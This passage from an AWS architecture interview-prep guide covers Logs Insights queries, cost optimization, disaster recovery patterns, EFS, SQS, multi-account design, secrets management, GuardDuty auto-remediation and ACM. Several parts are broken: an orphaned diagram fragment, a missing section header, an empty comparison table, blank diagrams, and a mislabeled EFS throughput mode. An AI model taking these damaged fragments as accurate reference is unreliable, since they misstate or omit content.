**Multi-account:** Each account runs its own CloudWatch Agent. Metrics and logs can be shared with a monitoring account using CloudWatch Cross-Account Observability.

---

### Q15.3: You have millions of log entries across dozens of log groups. How do you efficiently search and analyze them?

**Answer:**

**Context:** CloudWatch Logs Insights provides SQL-like query capability across log groups.

**CloudWatch Logs Insights:**

```sql
-- Find top 10 slowest API calls in the last hour
fields @timestamp, @message
| parse @message "request_path=* response_time=* status=*" as path, latency, status
| filter latency > 1000
| sort latency desc
| limit 10

-- Error rate by endpoint over time
fields @timestamp, @message
| parse @message "path=* status=*" as path, status
| stats count() as total,
        sum(status >= 500) as errors,
        (sum(status >= 500) / count()) * 100 as error_rate
  by bin(5m), path
| sort error_rate desc

-- Unique IP addresses making the most requests
fields @timestamp, @message
| parse @message "source_ip=*" as ip
| stats count() as requests by ip
| sort requests desc
| limit 20
```

**Key capabilities:**
- Query multiple log groups simultaneously.
- Automatic field discovery from JSON logs.
- `parse` command for custom parsing of unstructured logs.
- `stats` with `count`, `sum`, `avg`, `min`, `max`, `pct` (percentile).
- `bin()` for time-based aggregation.
- Results can be exported to CloudWatch Dashboards.

**Cost:** $0.005 per GB of log data scanned.

**For deeper analysis:** Export logs to S3 → query with Athena (SQL on S3) or OpenSearch for full-text search, dashboards, and alerting.

**Metric Filters:** Convert log data into CloudWatch metrics. Example: Create a metric for every occurrence of "ERROR" in application logs, then alarm on it.

```
Log Entry: "2025-03-15 ERROR DatabaseConnection timeout after 30s"
    │
    ▼ Metric Filter: Pattern = "ERROR"
    │
    ▼ Custom Metric: ErrorCount (incremented)
    │
    ▼ CloudWatch Alarm: ErrorCount > 10 in 5 minutes
    │
    ▼ SNS → PagerDuty → On-call engineer
```

**Multi-account/Multi-region:** Logs Insights queries are regional and per-account by default. Cross-Account Observability allows querying across accounts from a monitoring account.

**Concepts introduced:**
- **CloudWatch Logs Insights:** SQL-like query engine for CloudWatch Logs. Supports parsing, filtering, aggregation, and visualization.
- **Metric Filters:** Extract numeric values or count patterns from logs and publish as CloudWatch metrics.

# 16. Cost Optimization

---

### Q16.1: Your company's AWS bill has grown to $500K/month. Walk through a systematic approach to cost optimization.

**Answer:**

**Context:** Cost optimization is an ongoing practice, not a one-time activity. AWS provides multiple mechanisms for reducing costs.

**Framework: The 5 pillars of AWS cost optimization**

```
1. Right-size resources
2. Choose the right pricing model
3. Optimize data transfer
4. Eliminate waste
5. Architect for cost efficiency
```

**Pillar 1: Right-sizing**

- Use AWS Compute Optimizer: ML-based analysis of EC2, EBS, Lambda, and ECS configurations. Recommends optimal instance types based on actual utilization.
- Look for instances consistently under 20% CPU/memory utilization — downsize or consolidate.
- Switch from x86 to Graviton (M7g, C7g, R7g) — typically 20-40% better price/performance.

**Pillar 2: Pricing models**

```
| Pricing Model         | Savings vs On-Demand | Commitment | Flexibility           |
|----------------------|---------------------|------------|----------------------|
| On-Demand            | 0%                  | None       | Full                 |
| Savings Plans (Compute)| 20-66%            | 1 or 3 yr  | Any instance family,  |
|                      |                     | $/hr       | region, OS, tenancy  |
| Savings Plans (EC2)  | ~72%                | 1 or 3 yr  | Specific instance    |
|                      |                     | $/hr       | family + region      |
| Reserved Instances   | 20-72%              | 1 or 3 yr  | Specific instance    |
|                      |                     | upfront    | type + AZ + OS       |
| Spot Instances       | Up to 90%           | None       | Can be interrupted   |
```

**Savings Plans vs Reserved Instances:**
- **Compute Savings Plans:** Commit to $/hr of compute. Applies to EC2, Lambda, and Fargate across ANY instance family, region, OS. Most flexible. Recommended for most organizations.
- **EC2 Instance Savings Plans:** Commit to a specific instance family (e.g., M6i) in a specific region. Deeper discount but less flexibility.
- **Reserved Instances:** Legacy model. Same concept but less flexible. Still used for RDS, ElastiCache, Redshift (which don't support Savings Plans).

**Pillar 3: Data transfer optimization**

- Cross-AZ data transfer: $0.01/GB each direction. Minimize by co-locating communicating services in the same AZ where possible (trade-off with HA).
- NAT Gateway data processing: $0.045/GB. Use VPC Endpoints for AWS service traffic (Q12.1).
- CloudFront to origin: Often cheaper than direct ALB data transfer.

**Pillar 4: Eliminate waste**

- Use AWS Cost Explorer to identify:
  - Unattached EBS volumes (detached but still charged).
  - Unused Elastic IPs ($0.005/hr when not attached).
  - Idle RDS instances (dev databases running 24/7).
  - Old EBS snapshots.
- Use AWS Trusted Advisor for automated waste detection.
- Implement resource tagging and cost allocation tags for department-level chargeback.

**Pillar 5: Architecture decisions**

- Serverless (Lambda + API Gateway + DynamoDB) for variable workloads — pay per use.
- S3 Lifecycle Policies (Q5.1) for storage tiering.
- ASG scheduling: Scale down dev/staging environments outside business hours.
- Spot Instances for stateless, fault-tolerant workloads (Q16.2).

**Multi-account:** Use consolidated billing in AWS Organizations. Savings Plans and RIs can be shared across accounts in an Organization. Use AWS Cost Explorer and AWS Budgets per account or per OU for granular tracking.

**Multi-region:** Evaluate whether multi-region is cost-justified. Each region has its own costs (NAT GWs, endpoints, data transfer). Cross-region data transfer is $0.02/GB.

**Concepts introduced:**
- **Savings Plans:** Commit to consistent compute spend ($/hr) for 1 or 3 years. Applies automatically to matching usage. Compute SP (most flexible) or EC2 SP (deeper discount, less flexible).
- **Reserved Instances (RIs):** Commit to specific instance types for 1 or 3 years. Upfront, partial upfront, or no upfront payment. Used for RDS, ElastiCache, Redshift.
- **AWS Compute Optimizer:** ML-based service that analyzes utilization and recommends right-sizing.
- **Cost Allocation Tags:** User-defined tags (e.g., `Team`, `Project`, `Environment`) used to categorize and track costs in billing reports.

---

### Q16.2: Your batch processing jobs run daily, take 2-4 hours, and are fault-tolerant (can restart on failure). How do you run them cheaply?

**Answer:**

**Context:** Fault-tolerant, interruptible workloads are ideal for Spot Instances.

**Spot Instances:**
- Spare EC2 capacity offered at up to 90% discount vs On-Demand.
- AWS can reclaim (interrupt) with 2-minute warning when it needs the capacity back.
- Not suitable for databases, single-point-of-failure services, or stateful applications that can't handle interruption.

**Strategies for reliable Spot usage:**

1. **Diversify across instance types and AZs:** Don't request only `c5.xlarge` in `us-east-1a`. Spread across `c5.xlarge`, `c5a.xlarge`, `c6i.xlarge`, `m5.xlarge` in all AZs. The ASG's mixed instances policy or EC2 Fleet handles this.

2. **Use Spot Fleet or EC2 Auto Scaling with mixed instances:**

```
ASG Mixed Instances Policy:
  On-Demand base: 1 instance (always running)
  On-Demand percentage above base: 20%
  Spot allocation: Capacity-optimized (picks pools with most available capacity)
  Instance types: c5.xlarge, c5a.xlarge, c6i.xlarge, m5.xlarge
```

3. **Handle interruptions:**
   - Use the 2-minute warning (via instance metadata or CloudWatch Events) to checkpoint work.
   - Design for idempotent, restartable jobs (e.g., batch processing with checkpoints to S3).
   - Use SQS for job queues — interrupted work returns to the queue.

4. **Spot Placement Score:** Before launching, check which regions/AZs have the best Spot availability for your instance types.

**Architecture for batch processing:**

```
EventBridge (scheduled: daily 2 AM)
       │
       ▼
Lambda: Submit Batch Job
       │
       ▼
AWS Batch / ASG (Spot Fleet)
       │
  ┌────┼────┐
  ▼    ▼    ▼
Spot  Spot  Spot
EC2   EC2   EC2
  │    │    │
  └────┼────┘
       │
  Process data from S3
  Write results to S3
  Update DynamoDB
```

**AWS Batch alternative:** Managed batch computing service that handles job scheduling, compute provisioning (including Spot), and retry logic. Simpler than managing your own ASG + job queue.

**Multi-account/Multi-region:** Spot capacity varies by region and AZ. For critical batch jobs, configure fallback to On-Demand or run in multiple regions to maximize Spot availability.

**Concepts introduced:**
- **Spot Instances:** Spare EC2 capacity at up to 90% discount. Can be interrupted with 2-minute warning. Best for fault-tolerant, stateless workloads.
- **Spot Fleet / EC2 Fleet:** Manages a collection of Spot (and optionally On-Demand) instances across multiple instance types and AZs. Allocation strategies: capacity-optimized (recommended), lowest-price, diversified.
- **AWS Batch:** Managed service for batch computing. Handles job scheduling, compute management (Spot-aware), and retry logic.

# 17. Disaster Recovery

---

### Q17.1: Define RPO and RTO and explain how they drive your DR architecture choices.

**Answer:**

**Context:** DR planning starts with business requirements for recovery objectives.

**RPO (Recovery Point Objective):** The maximum acceptable amount of data loss measured in time. RPO = 1 hour means you can lose at most 1 hour of data.

**RTO (Recovery Time Objective):** The maximum acceptable downtime. RTO = 4 hours means the system must be fully operational within 4 hours of a disaster.

**How they drive architecture:**

```
| RPO / RTO         | DR Strategy         | AWS Implementation                        | Cost    |
|-------------------|---------------------|--------------------------------------------|---------|
| RPO: hours        | Backup & Restore    | EBS Snapshots, RDS snapshots, S3 CRR       | $       |
| RTO: hours        |                     | Restore from snapshots in DR region         |         |
|-------------------|---------------------|--------------------------------------------|---------|
| RPO: minutes      | Pilot Light         | Data replication active. Minimal compute    | $$      |
| RTO: 10-30 min    |                     | in DR. Scale up on failover.               |         |
|-------------------|---------------------|--------------------------------------------|---------|
| RPO: seconds      | Warm Standby        | Scaled-down but running in DR.             | $$$     |
| RTO: minutes      |                     | Scale up on failover.                      |         |
|-------------------|---------------------|--------------------------------------------|---------|
| RPO: near-zero    | Active-Active       | Full capacity in both regions.             | $$$$    |
| RTO: near-zero    | (Multi-site)        | Route 53 routes to both.                   |         |
```

**Key principle:** Lower RPO/RTO = higher cost. The business must define acceptable RPO/RTO based on the cost of downtime vs the cost of DR infrastructure.

**Concepts introduced:**
- **RPO (Recovery Point Objective):** Maximum acceptable data loss in time.
- **RTO (Recovery Time Objective):** Maximum acceptable downtime.

---

### Q17.2: Design a Pilot Light DR strategy for a three-tier web application deployed in us-east-1 with failover to eu-west-1.

**Answer:**

**Context:** Pilot Light keeps the "flame" alive — critical data systems replicate continuously, but compute resources are NOT running in the DR region until needed.

**Architecture:**

```
Primary: us-east-1 (Active)                    DR: eu-west-1 (Pilot Light)
┌───────────────────────────┐                  ┌───────────────────────────┐
│                           │                  │                           │
│  Route 53 ──► CloudFront  │                  │  (Inactive resources)     │
│         ──► ALB           │                  │                           │
│         ──► ASG (running) │                  │  AMI copies (latest)      │
│         ──► RDS Primary   │──── CRR/repl ──►│  RDS Read Replica (running)│
│         ──► S3 Bucket     │──── CRR ───────►│  S3 Bucket (replica)      │
│                           │                  │  Launch Template (ready)  │
│                           │                  │  ALB (configured, no TGs) │
└───────────────────────────┘                  └───────────────────────────┘
```

**What's running in DR (the "pilot light"):**
- RDS cross-region read replica — always syncing.
- S3 CRR — objects replicate continuously.
- Infrastructure code (CloudFormation/Terraform) — ready to deploy.
- AMIs — copied to DR region regularly.

**What's NOT running (to save cost):**
- EC2 instances (no ASG desired capacity).
- ALB target groups (empty or minimal).
- NAT Gateways (can be provisioned on failover).

**Failover procedure:**

1. **Detect failure:** Route 53 health check on primary fails.
2. **Promote RDS replica:** Promote the cross-region read replica to a standalone primary in eu-west-1. This takes 5-10 minutes.
3. **Launch compute:** Scale up ASG in eu-west-1 (set desired capacity). Instances launch from pre-copied AMIs.
4. **Update DNS:** Route 53 failover record switches to eu-west-1 ALB.
5. **Validate:** Run health checks against the DR stack.

**Total failover time: 15-30 minutes (RTO)**
**Data loss: Minutes (RPO) — limited by RDS async replication lag**

**Automation:**
- Use Route 53 health checks + CloudWatch Alarms + Lambda for automated failover.
- Or use AWS Elastic Disaster Recovery (DRS) — continuous replication with push-button failover.

**Trade-offs:**
- Pilot Light is much cheaper than Warm Standby (no running compute in DR).
- But RTO is higher (15-30 min vs minutes) because you need to spin up resources.
- RDS replica promotion is the bottleneck — cannot be parallelized.

**Warm Standby enhancement:**
Keep a minimal compute footprint running in DR (e.g., ASG with min=1). On failover, just scale up. Reduces RTO to 5-10 minutes.

**Active-Active enhancement:**
Full capacity in both regions, both serving traffic simultaneously. Route 53 latency-based routing. DynamoDB Global Tables or Aurora Global Database for data. Near-zero RPO/RTO but double the cost.

**Multi-account:** DR resources can be in a separate account for isolation. Cross-account replication for RDS (via snapshot sharing) and S3 (via CRR with cross-account buckets).

**Multi-region:** This IS the multi-region DR pattern. The choice of DR region should consider: latency to users, regulatory requirements (data residency), and service availability.

**Concepts introduced:**
- **Pilot Light DR:** Critical data systems replicate continuously to DR region. Compute resources are provisioned but NOT running. Scale up on failover.
- **Warm Standby DR:** Scaled-down but RUNNING infrastructure in DR. Faster failover than Pilot Light.
- **Active-Active DR:** Full capacity in multiple regions, both serving traffic simultaneously. Near-zero RPO/RTO.
- **AWS Elastic Disaster Recovery (DRS):** Managed service for continuous replication and push-button failover. Replaces traditional DR solutions.

# 18. EFS — Shared File Storage

---

### Q18.1: Multiple EC2 instances in an Auto Scaling Group need to share the same filesystem (e.g., a CMS with shared media uploads). EBS won't work because it's single-instance. What do you use?

**Answer:**

**Context:** EBS volumes attach to a single EC2 instance (with EBS Multi-Attach limited to io2 in the same AZ, and only for cluster-aware filesystems). For standard shared storage, use EFS.

**Amazon EFS (Elastic File System):**

```
          ┌─────────────────────────────────┐
          │  EFS File System (NFS v4.1)      │
          │                                  │
          │  Mount Targets:                  │
          │    AZ-a: mt-xxx (10.0.1.50)      │
          │    AZ-b: mt-yyy (10.0.2.50)      │
          └──────┬──────────────┬────────────┘
                 │              │
           AZ-a  │        AZ-b │
        ┌────────┴───┐  ┌──────┴─────┐
        │ EC2-1      │  │ EC2-2      │
        │ mount      │  │ mount      │
        │ /shared    │  │ /shared    │
        └────────────┘  └────────────┘
```

**Key characteristics:**
- NFS v4.1 protocol — mount like any NFS share.
- Elastic: Automatically grows and shrinks. No capacity provisioning.
- Multi-AZ: Mount targets in each AZ provide HA.
- Supports thousands of concurrent connections.
- POSIX-compliant: Supports permissions, file locking, directories.

**Performance Modes:**
1. **General Purpose (default):** Lower latency. Good for web serving, content management, development. 7,000 IOPS limit.
2. **Max I/O:** Higher aggregate throughput and IOPS. Higher latency. Good for big data, media processing. No IOPS limit.

**Throughput Modes:**
1. **Bursting (default):** Throughput scales with storage size (50 MiB/s per TiB). Burst credits for spikes.
2. **Provisioned (Elastic):** Pay for throughput independently of storage. Good when you need high throughput with small file count.
3. **Elastic:** Automatically scales throughput based on workload. Pay per usage. Recommended for most workloads.

**Storage Classes:**
- Standard: Frequently accessed.
- Infrequent Access (IA): ~85% cheaper. Per-access fee. Use lifecycle policies to auto-tier.
- One Zone Standard / One Zone IA: Single AZ — cheaper but no AZ redundancy.

**EFS vs EBS vs S3:**

```

|------------------|---------------------|---------------------|---------------------|

| Latency          | Sub-ms              | Low ms              | Higher (HTTP)       |
```

**Multi-account:** EFS can be shared across accounts using Resource Access Manager (RAM) or VPC peering. Mount targets are in a specific VPC; consumer accounts access via peering or TGW.

**Multi-region:** EFS is regional (multi-AZ). For cross-region, use EFS Replication — asynchronous replication to another region. RPO of ~15 minutes.

**Concepts introduced:**
- **EFS (Elastic File System):** Managed NFS file system. Multi-AZ, elastic, POSIX-compliant. Supports thousands of concurrent mounts.
- **EFS Mount Target:** A network endpoint (ENI) in a specific AZ/subnet. Instances in that AZ mount through the mount target.
- **EFS Performance Modes:** General Purpose (low latency, 7K IOPS limit) vs Max I/O (high throughput, higher latency).

# 19. SQS — Messaging

---

### Q19.1: Your application experiences traffic spikes that overwhelm the backend processing service. How do you use SQS to decouple and absorb these spikes?

**Answer:**

**Context:** Tight coupling (web tier directly calls processing tier) means spikes in the web tier cascade to the processing tier.

**Architecture with SQS:**

```
Before (coupled):
  Web Tier ──direct call──► Processing Tier (overwhelmed during spikes)

After (decoupled):
  Web Tier ──► SQS Queue ──► Processing Tier (pulls at its own pace)
                   │
                   └── Messages buffered during spikes
```

**SQS Key Concepts:**

1. **Standard Queue (default):**
   - Nearly unlimited throughput.
   - At-least-once delivery (message may be delivered more than once).
   - Best-effort ordering (messages might arrive out of order).
   - Use when: High throughput, idempotent processing.

2. **FIFO Queue:**
   - Exactly-once processing.
   - Strict ordering within a message group.
   - Limited to 3,000 messages/sec with batching (300 without).
   - Use when: Order matters (financial transactions, command sequences).

**Visibility Timeout:**
- When a consumer receives a message, it becomes "invisible" to other consumers for the visibility timeout period (default 30s).
- If the consumer processes the message and deletes it within this window → success.
- If the consumer fails (crashes), the message becomes visible again and is redelivered.
- Set visibility timeout to slightly longer than your maximum processing time.

**Dead Letter Queue (DLQ):**
- After N failed processing attempts (configurable `maxReceiveCount`), the message is moved to a DLQ.
- Prevents poison messages from blocking the queue forever.
- Monitor DLQ depth → alerts on failed processing.

**Long Polling:**
- Default (short polling): Returns immediately, even if no messages (wastes API calls).
- Long polling: Waits up to 20 seconds for a message to arrive. Reduces empty responses and cost.
- Enable by setting `WaitTimeSeconds=20` on `ReceiveMessage` calls or on the queue itself.

**SQS + Lambda:**

```
SQS Queue → Lambda (event source mapping)
  - Lambda polls the queue automatically.
  - Batch size: 1–10 messages per invocation.
  - Lambda scales concurrency based on queue depth.
  - Failed batches return to the queue (visibility timeout).
```

**SQS + ASG (EC2 consumers):**

```
SQS Queue → ASG (EC2 workers)
  - Scale on ApproximateNumberOfMessagesVisible (CloudWatch metric).
  - Custom metric: messages per instance = queue depth / running instances.
  - Target tracking: Keep messages per instance at ~0.
```

**Multi-account:** SQS queues can be accessed cross-account using queue policies (resource-based policies). Similar to S3 bucket policies. The consuming account's IAM role must also have the relevant SQS permissions.

**Multi-region:** SQS queues are regional. For multi-region, use SNS fanout to SQS queues in each region, or replicate messages with Lambda.

**Concepts introduced:**
- **SQS (Simple Queue Service):** Managed message queue. Standard (high throughput, at-least-once) and FIFO (ordered, exactly-once).
- **Visibility Timeout:** Time a received message is invisible to other consumers. Prevents duplicate processing during the processing window.
- **Dead Letter Queue (DLQ):** Destination for messages that fail processing after N attempts. Prevents queue blocking.
- **Long Polling:** Reduces empty API responses by waiting up to 20 seconds for messages. Saves cost and reduces latency.

# 20. AWS Organizations & Multi-Account Strategy

---

### Q20.1: Design a multi-account strategy for an enterprise with 200 developers across 5 product teams, requiring production isolation, centralized security, and cost management.

**Answer:**

**Context:** A single AWS account for everything is an anti-pattern — security blast radius, billing confusion, resource limits, and no isolation between teams.

**Recommended OU (Organizational Unit) Structure:**

```
Root
├── Management OU
│   └── Management Account (billing, Organizations)
│
├── Security OU
│   ├── Security Tooling Account (GuardDuty, Security Hub, Config)
│   └── Log Archive Account (CloudTrail, VPC Flow Logs, Config logs)
│
├── Infrastructure OU
│   ├── Network Account (Transit Gateway, DNS, VPN)
│   └── Shared Services Account (CI/CD, artifact repos, AMI factory)
│
├── Sandbox OU
│   └── Individual developer sandboxes (limited budget, SCPs)
│
├── Workloads OU
│   ├── Product-A OU
│   │   ├── Product-A Dev Account
│   │   ├── Product-A Staging Account
│   │   └── Product-A Prod Account
│   ├── Product-B OU
│   │   ├── Product-B Dev Account
│   │   └── Product-B Prod Account
│   └── ... (5 product teams)
│
└── Suspended OU
    └── Decommissioned accounts (SCP: deny all)
```

**SCP strategy (Q2.3 — SCPs explained earlier):**
- Root OU: Region restriction, deny leaving Organization.
- Security OU: Deny modification of security tooling, CloudTrail, Config.
- Sandbox OU: Budget limits, restricted instance sizes, no production services.
- Prod Accounts: Deny deletion of critical resources, enforce encryption.
- Suspended OU: Deny all actions.

**Centralized services:**

1. **Networking (Hub):** Transit Gateway in Network Account, shared via RAM. All VPCs attach to TGW. (Q1.5)
2. **Logging:** CloudTrail Organization Trail — logs all API calls across all accounts to the Log Archive Account's S3 bucket. (Q5.3 — Object Lock for immutability.)
3. **Security:** GuardDuty, Security Hub, Config aggregated in Security Tooling Account. Delegated administrators.
4. **Billing:** Consolidated billing via Organizations. Cost allocation tags per team. AWS Budgets per account.
5. **Identity:** AWS IAM Identity Center (SSO) for centralized user management. Users assume roles in target accounts.

**AWS Control Tower:** Automates multi-account setup with landing zones, guardrails (SCPs + Config rules), and account factory. Recommended for greenfield Organizations.

**Multi-region:** This OU structure applies globally. SCPs and Organization Trails are global. Services like GuardDuty, Security Hub, and Config need to be enabled in each region.

**Concepts introduced:**
- **AWS Organizations:** Service for managing multiple AWS accounts. Consolidated billing, SCPs, organizational hierarchy (OUs).
- **Organizational Unit (OU):** A grouping of accounts within an Organization. SCPs applied to an OU cascade to all child accounts and OUs.
- **AWS Control Tower:** Automated multi-account landing zone setup. Provides guardrails, account factory, and dashboard.
- **IAM Identity Center (SSO):** Centralized SSO for all accounts in an Organization. Users authenticate once and assume roles in any account.

# 21. Secrets Manager & Systems Manager

---

### Q21.1: Your application needs database credentials and API keys. Should you use SSM Parameter Store or Secrets Manager? How do you manage secret rotation?

**Answer:**

**Context:** Both store configuration/secrets, but they serve different primary use cases.

**Comparison:**

```
| Feature              | SSM Parameter Store       | Secrets Manager            |
|----------------------|--------------------------|----------------------------|
| Primary use          | Config values, params    | Secrets (passwords, keys)  |
| Encryption           | Optional (SecureString)  | Always encrypted           |
| Automatic Rotation   | No                       | Yes (built-in for RDS,     |
|                      |                          | Redshift, DocumentDB)      |
| Custom Rotation      | No                       | Yes (Lambda-based)         |
| Cross-account access | Via IAM policies         | Via resource policies      |
| Cost (Standard)      | Free (up to 10K params) | $0.40/secret/month         |
| Cost (Advanced)      | $0.05/param/month        | + $0.05/10K API calls      |
| Versioning           | Yes                      | Yes (staging labels)       |
| Max size             | 8 KB (Advanced)          | 64 KB                      |
```

**Decision guidance:**
- **Database credentials, API keys, tokens:** Use Secrets Manager. Automatic rotation is the killer feature.
- **Application config, feature flags, non-secret parameters:** Use SSM Parameter Store (Standard tier — free).
- **Many teams use both:** Config in Parameter Store, secrets in Secrets Manager.

**Secrets Manager Rotation:**

```
Secrets Manager
       │
       ├── Secret: prod/db/credentials
       │     Value: {"username":"app","password":"Kj3!mNx..."}
       │
       ├── Rotation Configuration:
       │     Lambda: SecretsManager-rotation-function
       │     Interval: 30 days
       │
       └── Rotation Flow:
             1. Lambda creates new password
             2. Lambda updates DB with new password
             3. Lambda updates the secret in Secrets Manager
             4. Lambda tests the new credentials
             5. Secrets Manager makes new version current
```

**Application integration:**

```python
import boto3
import json

client = boto3.client('secretsmanager')

def get_db_credentials():
    response = client.get_secret_value(SecretId='prod/db/credentials')
    secret = json.loads(response['SecretString'])
    return secret['username'], secret['password']
```

**Caching:** AWS provides SDK extensions that cache secrets locally, reducing API calls and latency. Secrets are refreshed automatically when rotated.

**SSM Parameter Store hierarchy:**

```
/prod/
  /app/
    /db-host         → "prod-db.abc123.us-east-1.rds.amazonaws.com"
    /db-port         → "5432"
    /feature-flags   → '{"new-ui": true, "beta-api": false}'
  /infra/
    /vpc-id          → "vpc-abc123"
    /subnet-ids      → '["subnet-a","subnet-b"]'
```

Use parameter paths for organization. IAM policies can restrict access by path (e.g., a team can only access `/prod/app/*`).

**Multi-account:** Secrets Manager supports resource policies for cross-account access. SSM Parameter Store requires cross-account IAM role assumption (Q2.2) to access parameters.

**Multi-region:** Secrets Manager supports multi-region secret replication — replicate a secret to other regions with automatic sync. SSM Parameter Store has no native cross-region replication; use Lambda or custom automation.

**Concepts introduced:**
- **AWS Secrets Manager:** Managed secret storage with automatic rotation, versioning, and cross-region replication. Integrates with RDS, Redshift, DocumentDB for native rotation.
- **SSM Parameter Store:** Key-value store for configuration and secrets. Free at Standard tier. Supports SecureString (KMS-encrypted), hierarchical paths, and versioning.

└──────────────────────────────────────────────────────────────┘
```

**GuardDuty (Threat Detection):**
- Analyzes: CloudTrail logs, VPC Flow Logs, DNS query logs, EKS audit logs, S3 data events, RDS login activity, Lambda network activity.
- Uses ML and threat intelligence to detect:
  - Compromised instances (crypto mining, C2 communication).
  - Compromised credentials (unusual API calls from unknown IPs).
  - Recon activity (port scanning, brute force).
  - S3 bucket compromise (unusual access patterns).
- Findings are categorized by severity (Low, Medium, High, Critical).
- No agents to install — reads AWS native logs.

**Macie (Data Discovery):**
- Scans S3 buckets for sensitive data (PII, PHI, financial data, credentials).
- Uses ML and pattern matching to find: names, addresses, SSNs, credit card numbers, API keys.
- Identifies publicly accessible or unencrypted buckets with sensitive data.
- Generates findings with location (bucket, key, line number).

**Inspector (Vulnerability Assessment):**
- Scans EC2 instances, container images (ECR), and Lambda functions for:
  - Software vulnerabilities (CVEs).
  - Network reachability issues (exposed ports).
  - Code vulnerabilities in Lambda.
- Agent-based (SSM Agent) for EC2 — no manual scanning.
- Continuous scanning — detects new vulnerabilities as CVE databases update.

**Security Hub (Aggregation + Compliance):**
- Central dashboard for all security findings across accounts and regions.
- Runs automated compliance checks against security standards.
- Aggregates findings from GuardDuty, Macie, Inspector, Config, Firewall Manager, and third-party tools.
- Supports custom actions via EventBridge.

**Automated remediation flow:**

```

**Lambda Code Sample**

```python
# Minimal Lambda for GuardDuty/Security Hub auto-remediation

import boto3

ROLE_NAME = "GuardDutyRemediationRole"   # in member account
QUARANTINE_SG = "sg-xxxxxxxx"            # quarantine SG ID

def lambda_handler(event, context):
    account_id = event["account"]
    region = event["region"]

    # Extract EC2 instance ID from Security Hub finding
    finding = event["detail"]["findings"][0]
    instance_id = finding["Resources"][0]["Id"].split("/")[-1]

    # Assume role in member account
    sts = boto3.client("sts")
    assumed = sts.assume_role(
        RoleArn=f"arn:aws:iam::{account_id}:role/{ROLE_NAME}",
        RoleSessionName="remediation"
    )

    creds = assumed["Credentials"]

    ec2 = boto3.client(
        "ec2",
        region_name=region,
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"]
    )

    # Describe instance
    res = ec2.describe_instances(InstanceIds=[instance_id])
    instance = res["Reservations"][0]["Instances"][0]

    # 1. Snapshot EBS (forensics)
    for bd in instance.get("BlockDeviceMappings", []):
        vol_id = bd.get("Ebs", {}).get("VolumeId")
        if vol_id:
            ec2.create_snapshot(
                VolumeId=vol_id,
                Description=f"Forensics snapshot {instance_id}"
            )

    # 2. Quarantine (change SG)
    ec2.modify_instance_attribute(
        InstanceId=instance_id,
        Groups=[QUARANTINE_SG]
    )

    # 3. Stop instance
    ec2.stop_instances(InstanceIds=[instance_id])

    return {"status": "remediated", "instance": instance_id}
```

**Multi-account deployment:**
- GuardDuty: Enable in the security account as the delegated administrator. Auto-enables in all Organization member accounts.
- Security Hub: Same delegated administrator pattern. Aggregates findings from all accounts.
- Macie: Delegated admin. Centrally manage scanning across all accounts' S3 buckets.
- Inspector: Delegated admin. Centrally manage vulnerability scanning across all accounts.

**Multi-region:** All these services are regional. Enable in each region where you operate. Security Hub can aggregate cross-region findings into a single region using finding aggregation.

# 23. ACM — Certificate Management

---

### Q23.1: You need to set up HTTPS for your ALB-based application and your CloudFront distribution. How do you manage SSL/TLS certificates?

**Answer:**

**Context:** ACM (AWS Certificate Manager) provides free, auto-renewing public SSL/TLS certificates for use with AWS services.

**ACM Certificate Lifecycle:**

```
Request Certificate (domain: *.example.com)
       │
       ▼
Validation:
  DNS Validation (recommended): Add a CNAME record to Route 53
    → Auto-validates in minutes
    → Supports automatic renewal
  Email Validation: AWS sends validation email to domain contacts
    → Manual process
    → Less reliable for renewal
       │
       ▼
Certificate Issued (valid for 13 months)
       │
       ▼
Associate with AWS resource:
  - ALB listener (HTTPS:443)
  - CloudFront distribution
  - API Gateway custom domain
       │
       ▼
Auto-Renewal (60 days before expiry)
  DNS validation: Automatic (if DNS record still exists)
  Email validation: Requires manual approval
```

**Critical rules:**
- ACM certificates for CloudFront MUST be in **us-east-1** (regardless of where your ALB or app is).
- ACM certificates for ALB/API Gateway must be in the **same region** as the resource.
- ACM certificates cannot be exported (no private key access). For EC2/non-AWS services, use ACM Private CA or bring your own certificates.

**Wildcard certificates:** `*.example.com` covers `www.example.com`, `api.example.com`, etc. but NOT `example.com` (naked domain) or `sub.api.example.com` (multi-level). Add both `*.example.com` and `example.com` as Subject Alternative Names (SANs).

**Architecture:**

```
CloudFront (us-east-1 cert: *.example.com)
       │
       ▼
ALB (us-east-1 cert: *.example.com, or separate cert in ALB's region)
       │
       ▼
EC2 (no cert needed — ALB terminates TLS)
```

**TLS termination options:**
1. **ALB terminates TLS:** Client → HTTPS → ALB → HTTP → EC2. Simplest. ALB handles cert management.
2. **End-to-end encryption:** Client → HTTPS → ALB → HTTPS → EC2. Requires certs on EC2 instances too. More complex. Needed for compliance requiring in-transit encryption at all hops.
3. **NLB passthrough:** Client → TLS → NLB (TCP passthrough) → TLS → EC2. NLB doesn't terminate TLS. EC2 handles it. Useful when the backend needs to see the full TLS handshake.

**Multi-account:** ACM certificates are per-account, per-region. Share certificates indirectly: use ACM in the account owning the ALB/CloudFront. For cross-account services, each account manages its own certificates.

**Multi-region:** Separate certificates in each region for regional resources (ALBs). CloudFront always uses us-east-1 certificates.

**Concepts introduced:**
- **ACM (AWS Certificate Manager):** Free public SSL/TLS certificates. Auto-renewing. DNS or email validation. Must be in us-east-1 for CloudFront.
- **DNS Validation:** Prove domain ownership by adding a CNAME record. Enables automatic renewal.
- **TLS Termination:** Where the encrypted connection ends and decrypted traffic continues. Can be at ALB, NLB, CloudFront, or the application itself.

```

- **Speed:** Up to 1.25 Gbps per tunnel (2 tunnels for HA = 2.5 Gbps with ECMP on TGW).
- **Setup time:** Minutes to hours.
- **Cost:** ~$0.05/hr per VPN connection + data transfer.
- **Encryption:** IPsec (always encrypted).
- **Reliability:** Depends on internet — variable latency, possible outages.
- **Use case:** Quick setup, lower bandwidth needs, backup connection.

**Option 2: AWS Direct Connect**

```
On-Prem Data Center                              AWS

                                              VPC(s)
```

- **Speed:** 1 Gbps, 10 Gbps, or 100 Gbps dedicated connections. Sub-1G available via partners.
- **Setup time:** Weeks to months (physical infrastructure).
- **Cost:** Port hours ($0.30/hr for 1G) + data transfer out ($0.02/GB). No data-in charges.
- **Encryption:** NOT encrypted by default. Use MACsec (Layer 2) for 10G/100G or VPN over DX for IPsec.
- **Reliability:** Dedicated, consistent bandwidth and latency. Not shared with internet traffic.
- **Use case:** High bandwidth, consistent latency, large data transfers, hybrid databases.

**HA for Direct Connect:**
- Single DX connection is a single point of failure.
- Redundant DX connections at different DX locations.
- Or: DX primary + VPN backup (cheaper HA).

**Direct Connect Gateway:**
